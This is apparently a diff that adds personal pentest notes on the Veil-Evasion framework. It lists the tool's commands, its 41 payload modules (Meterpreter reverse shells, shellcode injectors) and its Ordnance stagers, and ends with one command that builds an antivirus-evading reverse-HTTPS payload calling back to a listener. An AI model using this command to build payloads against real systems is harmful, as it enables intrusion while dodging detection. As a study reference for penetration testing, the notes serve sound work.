@@ -1,0 +1,101 @@
+# VEIL 
+
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+Veil-Evasion Menu
+
+        41 payloads loaded
+
+Available Commands:
+
+        back                    Go to Veil's main menu
+        checkvt                 Check VirusTotal.com against generated hashes
+        clean                   Remove generated artifacts
+        exit                    Completely exit Veil
+        info                    Information on a specific payload
+        list                    List available payloads
+        use                     Use a specific payload
+
+Veil/Evasion>: list
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
+
+
+ [*] Available Payloads:
+
+        1)      autoit/shellcode_inject/flat.py
+
+        2)      auxiliary/coldwar_wrapper.py
+        3)      auxiliary/macro_converter.py
+        4)      auxiliary/pyinstaller_wrapper.py
+
+        5)      c/meterpreter/rev_http.py
+        6)      c/meterpreter/rev_http_service.py
+        7)      c/meterpreter/rev_tcp.py
+        8)      c/meterpreter/rev_tcp_service.py
+
+        9)      cs/meterpreter/rev_http.py
+        10)     cs/meterpreter/rev_https.py
+        11)     cs/meterpreter/rev_tcp.py
+        12)     cs/shellcode_inject/base64.py
+        13)     cs/shellcode_inject/virtual.py
+
+        14)     go/meterpreter/rev_http.py
+        15)     go/meterpreter/rev_https.py
+        16)     go/meterpreter/rev_tcp.py
+        17)     go/shellcode_inject/virtual.py
+
+        18)     lua/shellcode_inject/flat.py
+
+        19)     perl/shellcode_inject/flat.py
+
+        20)     powershell/meterpreter/rev_http.py
+        21)     powershell/meterpreter/rev_https.py
+        22)     powershell/meterpreter/rev_tcp.py
+        23)     powershell/shellcode_inject/psexec_virtual.py
+        24)     powershell/shellcode_inject/virtual.py
+
+        25)     python/meterpreter/bind_tcp.py
+        26)     python/meterpreter/rev_http.py
+        27)     python/meterpreter/rev_https.py
+        28)     python/meterpreter/rev_tcp.py
+        29)     python/shellcode_inject/aes_encrypt.py
+        30)     python/shellcode_inject/arc_encrypt.py
+        31)     python/shellcode_inject/base64_substitution.py
+        32)     python/shellcode_inject/des_encrypt.py
+        33)     python/shellcode_inject/flat.py
+        34)     python/shellcode_inject/letter_substitution.py
+        35)     python/shellcode_inject/pidinject.py
+        36)     python/shellcode_inject/stallion.py
+
+        37)     ruby/meterpreter/rev_http.py
+        38)     ruby/meterpreter/rev_https.py
+        39)     ruby/meterpreter/rev_tcp.py
+        40)     ruby/shellcode_inject/base64.py
+        41)     ruby/shellcode_inject/flat.py
+
+
+
+# Ordinance 
+Available Payload Modules
+        Command Line Name => Description
+-------------------------------------------------------------------------------
+
+        1)      bind_tcp          => Bind TCP Stager (Stage 1)
+
+        2)      rev_http          => Reverse HTTP Stager (Stage 1)
+        3)      rev_https         => Reverse HTTPS Stager (Stage 1)
+        4)      rev_tcp           => Reverse TCP Stager (Stage 1)
+        5)      rev_tcp_all_ports => Reverse TCP All Ports Stager (Stage 1)
+        6)      rev_tcp_dns       => Reverse TCP DNS Stager (Stage 1)
+
+
+###########
+sudo veil –t Evasion -p 14 --ordnance-payload rev_https --ip 192.168.1.7 --port 443 -o Outfile
